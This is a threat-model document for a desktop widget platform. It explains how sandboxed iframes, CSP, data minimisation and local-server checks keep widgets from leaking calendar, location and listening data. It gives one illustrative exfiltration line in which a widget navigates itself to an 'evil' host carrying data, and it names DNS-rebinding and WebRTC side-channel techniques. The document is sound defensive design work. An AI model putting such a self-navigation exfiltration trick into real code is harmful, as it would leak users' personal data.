# Security model & threat model

Orbit Desktop shows community-written widgets on your desktop, and those widgets get to see some
fairly personal data: your calendar, what you listen to, where you are. The design goal is that
**installing a widget never gives its author a way to get that data off your machine**, and that
a widget only sees the data it declared up front.

## Assets worth protecting

| asset | where it lives |
|---|---|
| calendar events (titles, times, locations) | `calendar` signal |
| location (lat/lon, place name) | `location` signal; place name also inside `weather` |
| listening history (track, artwork) | `nowPlaying` signal |
| system telemetry, LAN host names & latency | `system` signal |
| Claude usage meters (unofficial) | `claudeUsage` signal |
| everything else on the machine: files, `~/.claude.json`, keychain, other web origins | never exposed |

## Trust boundaries

```
 ┌──────────── trusted ─────────────┐        ┌──────── untrusted ────────┐
 │ host app / dev server (Python)   │  HTTP  │                           │
 │   providers, config validation   │◄──────►│ host page (runtime/)      │ trusted code,
 │   127.0.0.1 only                 │        │  same origin as server    │ untrusted DATA
 └──────────────────────────────────┘        │   │ postMessage            │
                                             │   ▼                        │
                                             │ plugin iframes (sandboxed) │ UNTRUSTED CODE
                                             └───────────────────────────┘
```

* **Trusted:** the dev server (later the Swift host app), the runtime page (`runtime/`), the SDK
  (`runtime/sdk/`), the built-in `color` / `gradient` / `image` / `video` backgrounds.
* **Untrusted:** everything under `widgets/` and `~/.config/orbit-desktop/widgets/`, including
  the bundled ones (they follow the same rules, which keeps the model honest).
* **Untrusted data:** calendar titles, track names, place names, weather payloads. Widgets must
  escape them (`ctx.esc`) or use `textContent`.

## Controls

### 1. Every plugin runs in a sandboxed, network-less frame
* `<iframe sandbox="allow-scripts">`: no `allow-same-origin`, so the frame gets an **opaque
  origin**. It cannot read the host DOM, cookies or storage, and it cannot call the provider API
  as the host. There is also no `allow-popups`, `allow-forms`, `allow-top-navigation` or
  `allow-modals`.
* `allow=""` (Permissions Policy): no camera, microphone, geolocation and so on. The frame
  response also sends a `Permissions-Policy` header.
* The frame document is served with this CSP header:

  ```
  default-src 'none'; script-src 'nonce-<random>'; style-src 'unsafe-inline'; img-src data: blob:;
  font-src 'none'; connect-src 'none'; media-src 'none'; frame-src 'none'; child-src 'none';
  worker-src 'none'; object-src 'none'; manifest-src 'none'; base-uri 'none'; form-action 'none';
  frame-ancestors http://127.0.0.1:<port> http://localhost:<port>; sandbox allow-scripts
  ```

  * no `fetch`/XHR/WebSocket/EventSource/beacon (`connect-src 'none'`), no remote images, fonts
    or media, no workers, no nested frames
  * scripts run only from the server-inlined `<script nonce>` tags (SDK + `widget.js`). There is
    no `eval` and no injected `<script>`, because there is no `'unsafe-eval'` and no
    `'strict-dynamic'`.
  * `style-src 'unsafe-inline'` is allowed so widgets can style themselves. CSS cannot exfiltrate
    anything when every fetch directive is `'none'`.
  * the CSP `sandbox` directive re-applies the sandbox even if someone opens `/frame/<id>` as a
    top-level page
* Verified in phase 1 with a hostile test plugin in WKWebView (the engine Plash uses): `fetch` to the internet and to the
  local API, image beacons, `parent.document`, `localStorage`, `document.cookie`, `window.open`
  and `eval` are all blocked in WebKit.

### 2. Data minimisation through `needs:`
* The host forwards a signal to a frame only when that plugin's manifest lists it in `needs:`.
  The SDK also drops undeclared signals as a second line of defence.
* Providers strip what widgets don't need:
  * weather has no coordinates, only the place name
  * Claude usage is only `{key, pct, resets}`
  * artwork is re-encoded to a 600 px JPEG `data:` URL, so no file paths or remote URLs leak
* `tools/validate.py` rejects unknown signals. Reviewers check that `needs` is minimal (see
  CONTRIBUTING).

### 3. All external I/O happens on the host side
Widgets never fetch. The only outbound requests the host makes are:

| request | when | data sent |
|---|---|---|
| `api.open-meteo.com` | `providers.weather.enabled` (default on) | coordinates rounded to 0.01 deg |
| `ipinfo.io` | only `providers.location.mode: ip` | your public IP (inherent) |
| `itunes.apple.com` | only `providers.now_playing.itunes_artwork_fallback: true` | artist + album / title |
| `i.scdn.co` | Spotify artwork for the current track | nothing beyond the request |
| `networkQuality` (Apple) | only `providers.speedtest.enabled: true` | bandwidth test |
| ping / TCP connect | only the configured `providers.ping.targets` | none |
| `air-quality-api.open-meteo.com` | `providers.weather.air` (with weather) | coordinates rounded to 0.01 deg |
| `api.wheretheiss.at` | only `providers.iss.enabled` | nothing beyond the request |
| `api.p2pquake.net` (HTTPS) | only `providers.quakes.enabled` | nothing beyond the request |
| `api.p2pquake.net` (WebSocket, host app) | EEW, `settings.json` `eew.enabled` | nothing beyond the request |
| `mreversegeocoder.gsi.go.jp` (host app) | EEW prefecture lookup, every 30 min | coordinates |
| `holidays-jp.github.io` | only `providers.holidays.enabled` | nothing beyond the request |
| `api.frankfurter.app` | only `providers.fx.enabled` | currency pair |
| the configured RSS URL (default `www.nhk.or.jp`) | only `providers.news.enabled` | nothing beyond the request |
| `ja.wikipedia.org` | only `providers.onthisday.enabled` | today's date (page title) |
| `ll.thespacedevs.com` | only `providers.launches.enabled` | nothing beyond the request |
| `services.swpc.noaa.gov` | only `providers.kp.enabled` | nothing beyond the request |
| `api.github.com` via your `gh` CLI | only `providers.github` / `contrib` / `rfc` enabled | authenticated as you (by `gh`) |

The runtime page itself has a CSP of `connect-src 'self'`, so it can only talk to the local
server.

### 4. The local server is not a confused deputy
* It binds `127.0.0.1` only.
* **Host header allow-list** (`127.0.0.1:<port>`, `localhost:<port>`) blocks DNS-rebinding
  attacks, where a web page you visit tries to read `/api/signals/calendar`.
* **Origin check** on `/api/*`: any request carrying a foreign `Origin` gets a 403.
* It is GET only (HEAD/POST/... return 405). There is no write API, and it never executes
  anything based on request input.
* It never lists directories and has no generic static handler. It serves only:
  * an explicit table of runtime files
  * `/frame/<id>` for plugins **used by the active layout**
  * `/plugins/<id>/assets/<path>`, only for paths listed in that plugin's manifest. The paths are
    validated, must be relative with no `..`, must resolve inside the plugin folder, and are
    limited to `.json`/`.txt`/`.csv` up to 4 MB.
  * `/media/background`, which serves only the single image or video file named in the layout.
* Ping hosts are validated against a strict pattern and passed after `--` to `/sbin/ping`, with
  no shell involved. AppleScript runs from constant scripts. Track metadata is never
  interpolated into a script.
* The YAML parser (`miniyaml.py`) is a strict subset. It has no tags, anchors, aliases or object
  construction, and it caps file size and nesting depth.

### 5. Self-navigation kill switch
A sandboxed frame *can* still navigate **itself**, for example
`location = "https://evil/?" + data`, and CSP has no directive that blocks that in shipping
browsers. The host counts `load` events per frame, so a second load means the frame navigated
away. When that happens the host **removes the frame and reports the plugin as stopped**. Because
`postMessage` to an opaque origin must use `'*'`, removing the frame also stops any further
signals reaching the foreign document. This is verified in WebKit.

## Residual risks (accepted in phase 1, tracked for the Swift host)

1. **One-shot exfiltration by self-navigation.** The request that leaves during the navigation
   can carry whatever that plugin had *already* received, and only signals it declared. The kill
   switch stops anything after that. *Mitigated in the Swift host app:* it loads the runtime in
   a WKWebView with a `WKContentRuleList` that blocks every non-loopback load, and a navigation
   delegate that cancels navigations to any other origin, in any frame, before a request is
   made. It remains open when you use the dev server with Plash or a browser.
2. **WebRTC / DNS prefetch side channels.** Some engines let `RTCPeerConnection` or DNS prefetch
   bypass `connect-src`. This has **not** been tested yet in phase 1. `tools/validate.py` flags
   any `RTCPeerConnection` use for reviewers. *Mitigated in the Swift host app:* WebRTC is
   switched off in its WKWebView configuration. WebKit has no public switch for this, so the app
   calls the SPI only when it exists. DNS prefetch is still untested.
3. **Timing / covert channels between plugins** are possible in theory, for example through CPU
   contention. They can't leave the machine without a network path.
4. **Resource abuse.** A plugin can burn CPU or GPU, but it can't hurt anything else. Backgrounds
   are capped by the SDK frame limiter (`fps`). Phase 2 can add per-frame watchdogs.
5. **Visual spoofing.** A widget could draw a fake system dialog. Frames are
   `pointer-events: none`, so nothing on the desktop layer is clickable or can take keystrokes.
6. **Local processes.** Any local process running as your user can query `127.0.0.1:<port>`. The
   dev server is not a boundary against your own user account, and neither is any desktop app.
7. **Unofficial Claude usage plugin.** It reads an undocumented field of `~/.claude.json`, a
   file that also holds account and project data. The provider extracts only the meters and
   nothing else from that file is passed on. It is off by default and labelled unofficial
   everywhere.

## Reporting
Please report vulnerabilities privately through GitHub Security Advisories on the repository,
not in public issues.
